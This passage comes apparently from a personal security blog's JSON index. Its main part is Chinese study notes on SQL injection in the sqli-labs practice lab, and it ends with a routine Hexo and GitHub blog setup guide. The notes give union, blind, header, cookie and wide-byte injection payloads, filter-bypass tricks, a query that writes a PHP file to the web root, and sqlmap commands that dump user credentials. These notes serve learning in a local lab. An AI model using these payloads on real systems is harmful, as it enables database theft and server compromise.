手工注入： 123456789127.0.0.1/sqli/Less-1/?id=1' order by 3 --+ ✔判断字段数联合查询：127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔123占位127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值 解读： 0x3a为 ”:“ sqlmap: 123456sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" --dbs --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security --tables --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users --columns --batch#下面(''是错的，要用\"\"或无引号，如下)sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C \"password,username\" --dump --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C password,username --dump --batch Less-2:‘’ LIMIT 0,1’‘ LIMIT 0,1sql: select * from admain where id=1 limit 0,1 Less-3：‘’1&#39;) LIMIT 0,1’‘1&#39;) LIMIT 0,1sql: select * from admain where id = (‘1’) limit 0,1 Less-4:‘“1&quot;) LIMIT 0,1’“1&quot;) LIMIT 0,1sql: select * from admain where id=(“1”) limit 0,1 get盲注：基于时间的盲注：Less-9: 127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ Less-10: 127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ 基于boolean的盲注：less-8: 1234127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+#可接在 and 后stustr(database(),1,1)asciii(stustr(database(),1,1))=N sqlmap: 1sqlmap -u \"注入点\" --technique T --dbs 注解： T 基于时间 （sqlmap -h/hh 查询详细） Techniques: These options can be used to tweak testing of specific SQL injection techniques 1--technique=TECH SQL injection techniques to use (default \"BEUSTQ\") B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 默认情况下会测试所有的方式，可选择 mysql读写文件：读： 前提：show global variables like “secure_file_priv”; 修改my.ini 重启phpstudy. select load_file(“f:\\1.txt”)； 1union select 1,load_file(f:www\\\\Less-7\\\\flag.txt),3 --+ 写： 前提：show variables like ‘%general%’; 查看其general_log 是否为 OFF。 若是，则修改为 on 。 1set global general_log &#x3D; on; 123union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\\\Less-7\\\\1.php&quot; --+127.0.0.1\\Less-7\\1.php #查看是否写入成功 sqlmap: 1234sqlmap -hhsqlmap -u \"注入点\" --file-read \"文件路经\"4444 --file-write4444 --file-dest post 基于报错 get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。 burpsuite burpsuite 抓取http数据包保存在文件中 sqlmap 1sqlmap -r 文件路径 -p 指定探测参数 get报错注入(未完善)1select count(*) floor(rand(0)*2) 注解： 011011 sql注入绕过大小写，编码，关键字屏蔽，内联注释 post 基于时间和布尔值的盲注burpsuite抓取http报文 时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ 布尔：… and (lenght (database() )&gt;5) –+ sqlmap 12时间 ： sqlmap -r \"文件路径\" -p 参数 --technique T 布尔： sqlmap -r \"文件路径\" -p 参数 --technique B http头中的注入在user-agent 和 referer 未被屏蔽时，可以进行注入 burpsuite user-agent: 1' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1 referer: 1' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1 post_update语句的注入1updatexml(1,concat(0x7e,version(),0x7e),1) 注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。 updatexml和extractvalue函数 cookie注入例：less-20 burpsuite 抓取，用” \\ “判断闭合符号，之后 and 1=1,或 and \\ or 加sql语句 sqlmap 12345sqlmap.py -r \"target.txt\" --level 3 --batch sqlmap.py -r \"target.txt\" --level 3 --batch --dbssqlmap.py -r \"target.txt\" --level 3 --batch -D security --tablessqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users --columns sqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users -C password,username --dump base64注入burpsuite 首先截取，decoder 进行加密，例如：admin\\ base64加密后为：YWRtaW5c 进行报错。 sqlmap 1sqlmap.py -r \"target.txt\" --level 3 --batch --tamper base64encode.py 绕过去除注释的sql注入注释符： –+ –空格 # /* 多行注释 */ preg_replace()函数来替换字符串或字符数组的莫些字符 例：less-23: 1?id=-1' union select 1,database(),'3 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-23/?id=1\" --batch --dbs … 绕过去除and or 的sql注入preg_replace()函数来替换字符串或字符数组的莫些字符 双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||) 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-25/?id=1\" --batch --dbs 绕过去除空格的sql注入%09 :Tab %0a ：换行 %20 ：空格 1http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-27/?id=1\" --batch --dbs 宽字节的注入原理： GBK ：宽字节字符集的一种，Mysql默认字符集, GBK占二字节，ASCII占一字节 php中编码为GBK，函数执行添加的是ASCII编码 %DF (常用)：会被php 中的addslashes 函数转义为” %DF\\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。 1http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-33/?id=1%df%27\" --search --level 3 --risk 1 --thread 10 其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可； GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。 1http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-32/?id=1\" --tamper=unmagicquotes.py Access偏移注入公式： 工具：owasp-zap access:小型数据库，只存在一个库，库内多个表。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"博客搭建","slug":"博客搭建","date":"2018-12-08T04:11:03.000Z","updated":"2020-05-09T23:36:22.913Z","comments":true,"path":"categories/菜鸟互助/博客搭建/","link":"","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"Hexo + Github 搭建 Blog 和 每次博客的部署","text":"Hexo + Github 搭建 Blog 和 每次博客的部署 准备工作1.安装git git下载地址：链接安装后验证 1$ git --version 出现类似下面的版本号，皆为成功git version 2.19.2.windows.1 2.安装node（其附带npm） node.js下载地址：链接安装后验证 1$ node -v 出现类似下面的版本号(安装最新版本)：v10.14.1 3.安装Hexo命令行输入： 1$ npm install -g hexo-cli 4.创建本地运行库 创建本地仓库文件夹：例F:\\github右键点击该文件夹，Git Bash Here，命令行输入 1$ hexo init myblog 初始化完成！ 本地试运行1.进入博客根目录（myblog） 1cd myblog 2.安装 1npm install 3.运行本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口) 1$ hexo server 此时在浏览器输入 http://localhost:4000/ ,访问到博客界面 部署在远程库这里将其部署在github上 1.创建Github账户 略，随便百度一下 2.创建github项目 创建一个名为yourname.github.io的项目（yourname为你github名） 3.生成密钥，用于ssh连接 在本地，右键网站根目录，点击Git Bash 输入下列命令yourname 即为github注册时的用户名youremail 为注册时的邮箱账号第三条命令生成密钥： 123$ git config --global user.name \"yourname\"$ git config --global user.email \"yourEmail\"$ ssh-keygen -t rsa -C \"yourEmail\" 此时在C:\\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。 4.修改配置文件 去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）： 1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master 5.将本地仓库同步到github 在第一次生成以及部署之前，需要安装一个扩展： 1$ npm install hexo-deployer-git --save 清除生成的静态网页缓存数据 1$ hexo clean 生成文章对应的静态页面 1$ hexo g 部署本地站点到github命令 1$ hexo deploy","categories":[{"name":"菜鸟互助","slug":"菜鸟互助","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"},{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"菜鸟互助","slug":"菜鸟互助","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"},{"name":"CSRF","slug":"CSRF","permalink":"https://lacc233.github.io/tags/CSRF/"},{"name":"xss","slug":"xss","permalink":"https://lacc233.github.io/tags/xss/"},{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}